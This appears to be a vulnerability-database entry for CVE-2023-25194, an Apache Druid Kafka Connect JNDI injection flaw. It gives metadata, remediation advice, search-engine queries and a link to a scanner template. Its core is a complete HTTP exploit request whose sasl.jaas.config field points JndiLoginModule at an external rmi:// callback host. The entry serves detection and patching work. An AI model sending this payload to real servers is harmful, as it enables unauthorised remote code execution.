---
layout: "post"
cve_id: "CVE-2023-25194"
title: "Apache Druid Kafka Connect - Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-25194.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-25194.yaml"
author: "j4vaovo"
severity: "high"
impact: "Authenticated attackers can exploit unsafe deserialization in the Kafka Connect REST API to execute arbitrary code through JNDI injection, potentially compromising the entire Apache Druid data analytics infrastructure.
"
remediation: "Apply Apache Druid security patches that validate and sanitize SASL JAAS configuration in Kafka connector settings to prevent JNDI injection attacks.
"
reference:
  - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25194"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-25194"
  - "https://github.com/nbxiglk0/Note/blob/0ddc14ecd296df472726863aa5d1f0f29c8adcc4/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java/ApacheDruid/ApacheDruid%20Kafka-rce/ApacheDruid%20Kafka-rce.md#apachedruid-kafka-connect-rce"
  - "http://packetstormsecurity.com/files/173151/Apache-Druid-JNDI-Injection-Remote-Code-Execution.html"
  - "https://kafka.apache.org/cve-list"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 8.8, 'cve-id': 'CVE-2023-25194', 'cwe-id': 'CWE-502', 'epss-score': 0.94055, 'epss-percentile': 0.99894, 'cpe': 'cpe:2.3:a:apache:kafka_connect:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'apache', 'product': 'kafka_connect', 'shodan-query': ['html:"Apache Druid"', 'http.html:"apache druid"'], 'fofa-query': 'body="apache druid"'}"
tags:
  - "packetstorm"
  - "cve"
  - "cve2023"
  - "apache"
  - "druid"
  - "kafka"
  - "rce"
  - "jndi"
  - "oast"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
The vulnerability has the potential to enable a remote attacker with authentication to run any code on the system. This is due to unsafe deserialization that occurs during the configuration of the connector through the Kafka Connect REST API


## üåê HTTP Request
```nohighlight
POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Connection: close
Content-Length: 1436
Content-Type: application/json
Accept-Encoding: gzip

{
    "type":"kafka",
    "spec":{
        "type":"kafka",
        "ioConfig":{
            "type":"kafka",
            "consumerProperties":{
                "bootstrap.servers":"127.0.0.1:6666",
                "sasl.mechanism":"SCRAM-SHA-256",
                "security.protocol":"SASL_SSL",
                "sasl.jaas.config":"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"rmi://d5ir50hle0o31052e1g0etmukjeo68sqz.oast.live:6666/test\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
            },
            "topic":"test",
            "useEarliestOffset":true,
            "inputFormat":{
                "type":"regex",
                "pattern":"([\\s\\S]*)",
                "listDelimiter":"56616469-6de2-9da4-efb8-8f416e6e6965",
                "columns":[
                    "raw"
                ]
            }
        },
        "dataSchema":{
            "dataSource":"sample",
            "timestampSpec":{
                "column":"!!!_no_such_column_!!!",
                "missingValue":"1970-01-01T00:00:00Z"
            },
            "dimensionsSpec":{

            },
            "granularitySpec":{
                "rollup":false
            }
        },
        "tuningConfig":{
            "type":"kafka"
        }
    },
    "samplerConfig":{
        "numRows":500,
        "timeoutMs":15000
    }
}
```

